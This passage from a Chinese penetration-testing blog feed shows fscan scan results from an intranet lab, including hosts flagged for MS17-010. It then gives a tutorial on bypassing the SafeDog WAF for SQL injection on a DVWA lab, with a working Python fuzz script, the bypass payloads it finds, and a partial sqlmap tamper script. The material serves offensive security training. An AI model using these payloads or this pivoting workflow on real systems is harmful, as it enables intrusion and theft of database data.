number">.52</span><span class="token number">.138</span><span class="token operator">:</span><span class="token number">445</span> open<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.143</span><span class="token operator">:</span><span class="token number">139</span> open<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.138</span><span class="token operator">:</span><span class="token number">88</span> open<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.141</span><span class="token operator">:</span><span class="token number">7001</span> open<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.143</span><span class="token operator">:</span><span class="token number">3306</span> open<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.141</span><span class="token operator">:</span><span class="token number">445</span> open<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.143</span><span class="token operator">:</span><span class="token number">445</span> open<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.141</span><span class="token operator">:</span><span class="token number">139</span> open<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.138</span><span class="token operator">:</span><span class="token number">139</span> open<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.143</span><span class="token operator">:</span><span class="token number">135</span> open<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.141</span><span class="token operator">:</span><span class="token number">135</span> open<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.141</span><span class="token operator">:</span><span class="token number">21</span> open<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.143</span><span class="token operator">:</span><span class="token number">80</span> open<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.138</span><span class="token operator">:</span><span class="token number">80</span> open<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.141</span><span class="token operator">:</span><span class="token number">8099</span> open<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.141</span><span class="token operator">:</span><span class="token number">7002</span> open<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.138</span><span class="token operator">:</span><span class="token number">135</span> open<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.141</span><span class="token operator">:</span><span class="token number">8098</span> open<span class="token literal-property property">NetInfo</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.143</span>   <span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span>stu1   <span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.143</span>   <span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token number">169.254</span><span class="token number">.129</span><span class="token number">.186</span>   <span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span><span class="token number">.92</span><span class="token number">.130</span><span class="token literal-property property">NetInfo</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.138</span>   <span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span>owa   <span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.138</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.143</span>       __MSBROWSE__\<span class="token constant">STU1</span>              Windows <span class="token number">7</span> Professional <span class="token number">7601</span> Service Pack <span class="token number">1</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.143</span><span class="token constant">MS17</span><span class="token operator">-</span><span class="token number">010</span><span class="token punctuation">(</span>Windows <span class="token number">7</span> Professional <span class="token number">7601</span> Service Pack <span class="token number">1</span><span class="token punctuation">)</span><span class="token literal-property property">NetInfo</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.141</span>   <span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span>root<span class="token operator">-</span>tvi862ubeh   <span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.141</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> WebTitle<span class="token operator">:</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.141</span><span class="token operator">:</span><span class="token number">7002</span> <span class="token literal-property property">code</span><span class="token operator">:</span><span class="token number">200</span> <span class="token literal-property property">len</span><span class="token operator">:</span><span class="token number">2632</span>   <span class="token literal-property property">title</span><span class="token operator">:</span>Sentinel Keys License Monitor<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.141</span>       <span class="token constant">GOD</span>\<span class="token constant">SNTL_ROOT</span><span class="token operator">-</span><span class="token constant">TVI86</span>   <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.138</span><span class="token constant">MS17</span><span class="token operator">-</span><span class="token number">010</span><span class="token punctuation">(</span>Windows Server <span class="token number">2008</span> <span class="token constant">R2</span> Datacenter <span class="token number">7601</span> Service Pack <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.138</span> <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span><span class="token constant">DC</span> <span class="token constant">GOD</span>\<span class="token constant">OWA</span>               Windows Server <span class="token number">2008</span> <span class="token constant">R2</span> Datacenter <span class="token number">7601</span> Service Pack <span class="token number">1</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.141</span><span class="token constant">MS17</span><span class="token operator">-</span><span class="token number">010</span><span class="token punctuation">(</span>Windows Server <span class="token number">2003</span> <span class="token number">3790</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> WebTitle<span class="token operator">:</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.138</span>     <span class="token literal-property property">code</span><span class="token operator">:</span><span class="token number">200</span> <span class="token literal-property property">len</span><span class="token operator">:</span><span class="token number">4</span>      <span class="token literal-property property">title</span><span class="token operator">:</span><span class="token constant">IIS7</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> WebTitle<span class="token operator">:</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.141</span><span class="token operator">:</span><span class="token number">8099</span> <span class="token literal-property property">code</span><span class="token operator">:</span><span class="token number">403</span> <span class="token literal-property property">len</span><span class="token operator">:</span><span class="token number">1409</span>   <span class="token literal-property property">title</span><span class="token operator">:</span>The page must be viewed over a secure channel<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> WebTitle<span class="token operator">:</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.143</span>     <span class="token literal-property property">code</span><span class="token operator">:</span><span class="token number">200</span> <span class="token literal-property property">len</span><span class="token operator">:</span><span class="token number">21</span>     <span class="token literal-property property">title</span><span class="token operator">:</span>phpStudy 探针 <span class="token number">2014</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> ftp<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.141</span><span class="token operator">:</span><span class="token number">21</span><span class="token operator">:</span>anonymous </code></pre><p>可以看到，扫描结果里包括了几大类信息：</p><ol><li>扫描的内网网段里存活的主机 IP 及其开放的端口；</li><li>扫描的内网网段里主机的名称、MS17-010 永恒之蓝等漏洞扫描结果（两台主机存在该漏洞）；</li><li>扫描的内网网段里主机开放的 Web 服务的标题、端口地址！</li></ol><p>此处验证下扫描到的几个内网 Web 服务是否真实存在：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210715002204258.png" alt="在这里插入图片描述" loading="lazy"><img src="https://img-blog.csdnimg.cn/20210715002215471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><img src="https://img-blog.csdnimg.cn/20210715002229266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy">看到这，你应该明白 fscan 这款内网神器有多香了吧！收集到如此多的内网资产信息，接下来的内网横向渗透就更加简便清晰了！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文学习、总结了内网穿透神器 FRP 反向代理工具的使用方法，同时介绍了 fscan 内网资产情况扫描神器的使用。在实际的攻防演习、内网渗透中，拿到外网跳板机的 Shell 权限后，我们可以使用 fscan 在跳板机上扫描内网进行资产搜集，然后使用 FRP 进行内网穿透后对收集到的内网资产进行横向渗透攻击！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;当我们拿下目标单位的一台外网服务器后，需要借助外网服务器作为跳板机去开展内网渗透，这个时候必不可少的就是在跳板机上设置代理。在前面的文章中，</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://tr0e.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Python攻防-Fuzz绕过安全狗进行SQL注入</title>
    <link href="https://tr0e.github.io/Python%E6%94%BB%E9%98%B2-Fuzz%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E8%BF%9B%E8%A1%8CSQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://tr0e.github.io/Python%E6%94%BB%E9%98%B2-Fuzz%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E8%BF%9B%E8%A1%8CSQL%E6%B3%A8%E5%85%A5/</id>
    <published>2021-04-18T17:47:56.000Z</published>
    <updated>2022-06-15T16:17:24.632Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在渗透测试过程中，经常会遇到很多 Web 站点部署了 WAF，这个时候使用常规的 Payload 进行 XSS、SQL 注入的检测避免不了被 WAF 拦截阻断的命运。<br><img src="https://img-blog.csdnimg.cn/20210418221038304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>Fuzz 模糊测试是一种有效的检测 WAF 过滤规则缺陷并尝试进行 WAF 绕过的技术，本文将以“PhpStudy+DVWA+ 安全狗v4.0”的实验环境演示 Fuzz 测试绕过 WAF。</p><h1 id="WAF部署"><a href="#WAF部署" class="headerlink" title="WAF部署"></a>WAF部署</h1><p>我在先前的博文：<a href="https://blog.csdn.net/weixin_39190897/article/details/103583673">渗透测试-浅析WAF绕过</a> 中简述过 WAF 的绕过技术，读者可参考阅读。<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418223622493.png" alt="在这里插入图片描述" loading="lazy"></p><h2 id="WAF简述"><a href="#WAF简述" class="headerlink" title="WAF简述"></a>WAF简述</h2><p>先来回顾下 WAF 的基础常识。</p><p><strong>目前主流的WAF产品</strong><br>| WAF类型      | 主流产品                                     |<br>| ———— | ——————————————– |<br>| 云WAF        | 阿里云盾、腾讯网站管家、创宇盾、ClodeFlare等 |<br>| 软件产品类   | 安全狗、云锁、360主机卫士、ModSecurity       |<br>| 硬件类型设备 | 启明星辰、绿盟、天融信、飞塔等               |</p><p><strong>WAF为什么会被绕过:</strong></p><ol><li>鱼（安全）和熊掌（业务性能）不能兼得，WAF 需要满足基本业务需求，所以一般不设置白名单之类的过于苛刻的操作；</li><li>WAF 为了考虑通用性的问题，无法 100% 覆盖某些语言、中间件、数据库等特性；</li><li>硬件 WAF 自身往往存在漏洞（硬件 WAF 对 HTTP 协议的兼容性不强，对异常报文会产生 bug，导致绕过）；</li><li>WAF 的过滤、防范规则缺陷（如正则匹配绕过）。</li></ol><h2 id="网站安全狗"><a href="#网站安全狗" class="headerlink" title="网站安全狗"></a>网站安全狗</h2><p>网站安全狗是一款集网站内容安全防护、网站资源保护及网站流量保护功能为一体的服务器工具。功能涵盖了网马/木马扫描、防 SQL 注入、防盗链、防 CC 攻击、网站流量实时监控、网站 CPU 监控、下载线程保护、IP 黑白名单管理、网页防篡改功能等模块。安全狗能够为用户提供实时的网站安全防护，避免各类针对网站的攻击所带来的危害。</p><p><strong>DVWA靶场搭建</strong></p><p>为了演示安全狗 WAF 的防护作用和对其进行绕过，需要先搭建 DVWA 靶场。 本人在 Win7 虚拟机使用 phpstudy 集成环境（<a href="https://www.xp.cn/">下载地址</a>）直接部署 DVWA 靶场（<a href="http://www.dvwa.co.uk/">官网下载地址</a>），具体部署过程此处忽略（百度一搜一大把），部署后如下：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418230736393.png" alt="在这里插入图片描述" loading="lazy">此时暂未部署 WAF，在 Low 安全级别下对 SQL 注入进行测试，可成功注入代码：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418231330758.png" alt="在这里插入图片描述" loading="lazy"><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/2021041823153129.png" alt="在这里插入图片描述" loading="lazy">具体的注入测试和完整的获取数据库账户密码的过程，读者可参见先前另一篇博文的记录：<a href="https://blog.csdn.net/weixin_39190897/article/details/86698770">Web安全-SQL注入漏洞</a>，此处不再展开。</p><p><strong>网站安全狗部署</strong></p><p>1、如下是 <a href="https://www.safedog.cn/">安全狗的官网</a>，可下载免费版的网站安全狗：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418224915896.png" alt="在这里插入图片描述" loading="lazy">2、选择最新的 Apache 版 v4.0 并下载：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418224951181.png" alt="在这里插入图片描述" loading="lazy">3、下载完一键安装即可，但需要注意的一点是，安装安全狗插件时，需要知道 Apache 服务名，新版的 phpstudy 是无法直接查看的，将导致安全狗安装程序找不到对应的 Apache 服务名：<br><img src="https://img-blog.csdnimg.cn/20210418233249800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>4、此时需要先关闭 phpstudy 的 Apache 服务，并进入 phpstudy 的 Apache 安装目录的 bin 文件夹下打开 CMD，输入下面命令：</p><pre class="language-bash" data-language="bash"><code class="language-bash">httpd.exe -k <span class="token function">install</span> -n apache2.4</code></pre><p>5、接着重新安装安全狗即可成功安装，如下图所示：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418233223170.png" alt="在这里插入图片描述" loading="lazy"><br>6、可以查看下安全狗默认开启的 HTTP 安全检测规则：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/2021041823423270.png" alt="在这里插入图片描述" loading="lazy"><br>7、开启安全狗对 DVWA 靶场站点进行安全防护后，再次进行 SQL 注入测试（简单的<code>1&#39; and &#39;1&#39;=&#39;1</code>)则立马会被拦截：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418234651877.png" alt="在这里插入图片描述" loading="lazy"></p><p>拦截页面如下：<br><img src="https://img-blog.csdnimg.cn/20210418234628879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h1 id="Fuzz脚本绕过"><a href="#Fuzz脚本绕过" class="headerlink" title="Fuzz脚本绕过"></a>Fuzz脚本绕过</h1><p>下面就来演示通过 Python 脚本进行 Fuzz 测试，如何成功找到有效的 Payload 绕过安全狗。</p><h2 id="Fuzz脚本"><a href="#Fuzz脚本" class="headerlink" title="Fuzz脚本"></a>Fuzz脚本</h2><p>先上最终的 Fuzz 脚本 <code>sqlfuzz.py</code>：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token comment">#python3过狗脚本，自行验证</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys fuzz_zs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'/*'</span><span class="token punctuation">,</span><span class="token string">'*/'</span><span class="token punctuation">,</span><span class="token string">'/*!'</span><span class="token punctuation">,</span><span class="token string">'/**/'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">,</span><span class="token string">'='</span><span class="token punctuation">,</span><span class="token string">'`'</span><span class="token punctuation">,</span><span class="token string">'!'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token string">'+'</span><span class="token punctuation">]</span>fuzz_sz <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span>fuzz_ch <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"%09"</span><span class="token punctuation">,</span><span class="token string">"%0a"</span><span class="token punctuation">,</span><span class="token string">"%0b"</span><span class="token punctuation">,</span><span class="token string">"%0c"</span><span class="token punctuation">,</span><span class="token string">"%0d"</span><span class="token punctuation">,</span><span class="token string">"%20"</span><span class="token punctuation">,</span><span class="token string">"%a0"</span><span class="token punctuation">]</span>fuzz <span class="token operator">=</span> fuzz_zs<span class="token operator">+</span>fuzz_ch<span class="token operator">+</span>fuzz_szheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"</span><span class="token punctuation">,</span>    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"security=low; PHPSESSID=jga8ilgk0h7h36sps6jvr71pub"</span><span class="token punctuation">&#125;</span>url_start <span class="token operator">=</span> <span class="token string">"http://192.168.88.119/DVWA/vulnerabilities/sqli/?id=1"</span><span class="token comment">#需要测试的Payload总数量 </span><span class="token builtin">len</span> <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span><span class="token operator">**</span><span class="token number">3</span>num <span class="token operator">=</span> <span class="token number">0</span><span class="token comment">#三层嵌套组合，也可增加为4、5、6层……</span><span class="token keyword">for</span> a <span class="token keyword">in</span> fuzz<span class="token punctuation">:</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> fuzz<span class="token punctuation">:</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> fuzz<span class="token punctuation">:</span>            num <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token comment">#payload = "'/*!union"+a+b+c+"select*/1,2#"</span>            <span class="token comment">#payload = "'/**//*!*/AND/*!*/"+a+b+c+"/**/order/**/by/**/1--+"</span>            <span class="token comment">#成功绕过安全狗</span>            payload <span class="token operator">=</span> <span class="token string">"'/**//*!*/and/*!*/"</span><span class="token operator">+</span>a<span class="token operator">+</span>b<span class="token operator">+</span>c<span class="token operator">+</span><span class="token string">"/**/'1'='1"</span>            url <span class="token operator">=</span> url_start <span class="token operator">+</span> payload<span class="token operator">+</span><span class="token string">"&amp;Submit=Submit#"</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">' '</span><span class="token operator">*</span><span class="token number">30</span> <span class="token operator">+</span><span class="token string">'\r'</span><span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Now URL:"</span><span class="token operator">+</span>url<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"完成进度:%s/%s \r"</span> <span class="token operator">%</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"First name: admin"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\033[0;33m[*]Find BypassWAF Payload:\033[0m"</span><span class="token operator">+</span>url<span class="token punctuation">)</span>                         <span class="token keyword">with</span> <span class="token builtin">open</span> <span class="token punctuation">(</span><span class="token string">"Results.txt"</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> r<span class="token punctuation">:</span>                    r<span class="token punctuation">.</span>write<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>                </code></pre><p>以上代码注意几点：</p><ol><li>以上判定 Payload 是否有效的条件是搜索响应包中是否包含”<code>First name: admin</code>“，原因是 Payload 无效的话要么是安全狗拦截页面，要么是 SQL 注入语法报错页面，均不会成功回显数据库查询结果；</li><li>Fuzz 字典是依据 Mysql 数据库的一些特性组合生成的有可能产生绕过 WAF 的字符；</li><li>注意请求头中的 Cookie 在此处是必备的字段！不添加 Cookie 的话直接发送 request 请求只会显示未登录并集中跳转到登陆页面。要获取有效的登录后的 Cookie 可通过 BurpSuite 抓包读取：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419000730422.png" alt="在这里插入图片描述" loading="lazy"></li></ol><h2 id="脚本效果"><a href="#脚本效果" class="headerlink" title="脚本效果"></a>脚本效果</h2><p>来看看脚本执行的效果：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419001108395.png" alt="在这里插入图片描述" loading="lazy">可以看到，已经成功找到诸多可以绕过安全狗的 Payload（将脚本执行结束的话找到上百成千种 Payload 不是梦……），打开脚本存放的目录下自动生成的 <code>result.txt</code> 文件查看具体的 Payload：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419001342868.png" alt="在这里插入图片描述" loading="lazy">随便拿一个 Payload （第一个：<code>1&#39;/**//*!*/and/*!*//*/**//**/&#39;1&#39;=&#39;1</code>）试试：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419002754321.png" alt="在这里插入图片描述" loading="lazy"><br>改为<code>1&#39;/**//*!*/and/*!*//*/**//**/&#39;1&#39;=&#39;2</code>则无返回值：<br><img src="https://img-blog.csdnimg.cn/20210419003054987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>至此，已成功绕过安全狗对于 <code>1’ and &#39;1&#39;=&#39;1</code> 的测试 Payload 的拦截，成功借助以上变形的 Payload 判定该处存在 SQL 注入！</p><p>但是如何进一步地利用 SQL 注入读取数据库敏感数据，还需要进一步 Fuzz 测试绕过安全狗对其他关键词的检测拦截（如 <code>union、order、select、database()、user()</code>等），篇幅所限，该部分留给读者自行解决！</p><h1 id="SQLMap绕过"><a href="#SQLMap绕过" class="headerlink" title="SQLMap绕过"></a>SQLMap绕过</h1><p>对于上了网站安全狗的 DVWA 靶场，尝试使用 SQLMap 对上述 SQL 注入链接进行注入检测，结果可想而知，以失败告终：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/2021041900570913.png" alt="在这里插入图片描述" loading="lazy">而在 SQLMap 执行的过程中，虚拟机中的安全狗记录了大量的攻击日志：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419005811216.png" alt="在这里插入图片描述" loading="lazy"></p><p>下面参考的是 Freebuf 的 Anubis24 大佬的文章：<a href="https://www.freebuf.com/articles/web/234487.html">技术讨论 | Fuzz绕过安全狗4.0实现SQL注入</a>，使用了 BurpSuite 的 intruder 模块进行 fuzz，并修改了 Sqlmap 工具的 tamper 脚本，对安全狗进行绕过。</p><h2 id="Fuzz关键词"><a href="#Fuzz关键词" class="headerlink" title="Fuzz关键词"></a>Fuzz关键词</h2><p>1、如下图，测试<code>and</code>关键词，被安全狗拦截：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419012029463.png" alt="在这里插入图片描述" loading="lazy"></p><p>2、把数据包放到 intuder 里面，进行 fuzz，看看哪一个字符能绕过安全狗，爆破点如下图：<br><img src="https://img-blog.csdnimg.cn/20210419012102378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>3、字典选择 BurpSuite 自带的 <code>fuzzing-SQL injection</code>即可，设置如下图（ Github 上也有很多这种 Fuzz 字典）：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419012155190.png" alt="在这里插入图片描述" loading="lazy">4、开始 fuzz，如果有拦截就会是这样子：<br><img src="https://img-blog.csdnimg.cn/20210419012334776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>5、成功找到可以绕过安全狗拦截的 Payload：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419012441696.png" alt="在这里插入图片描述" loading="lazy">6、将 Payload： <code>1&#39;/**/and/*//*/&#39;1&#39;=&#39;1</code>放入网页进行测试：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/202104190126441.png" alt="在这里插入图片描述" loading="lazy"><br>7、改为<code>1&#39;/**/and/*//*/&#39;1&#39;=&#39;2</code>则查无数据，说明 Payload 已绕过安全狗并有效注入到数据库：<br><img src="https://img-blog.csdnimg.cn/20210419012731155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h2 id="tamper绕过"><a href="#tamper绕过" class="headerlink" title="tamper绕过"></a>tamper绕过</h2><p>SQLMap 在默认情况下除了使用<code>CHAR()</code>函数防止出现单引号，没有对注入的数据进行修改，读者还可以使用 <code>--tamper</code>参数对数据做修改来绕过WAF等设备，其中大部分脚本主要用正则模块替换攻击载荷字符编码的方式尝试绕过WAF的检测规则，命令如下所示：</p><pre class="language-python" data-language="python"><code class="language-python">sqlmap<span class="token punctuation">.</span>py XXXXX <span class="token operator">-</span><span class="token operator">-</span>tamper <span class="token string">"模块名"</span></code></pre><p>关于 tamper 脚本的用法，读者可参考博文：<a href="https://blog.csdn.net/Drifter_Galaxy/article/details/108435339">SQLMap绕过脚本tamper（from 《Web安全攻防渗透测试实战指南》）</a>。</p><p>在本地 SQLMap 的 tamper 文件夹下新建文件<code>test.py</code>，将 SQLMap 测试过程中的空格自动替换为<code>/*//*/</code>，如下所示:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python2</span><span class="token triple-quoted-string string">"""Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token 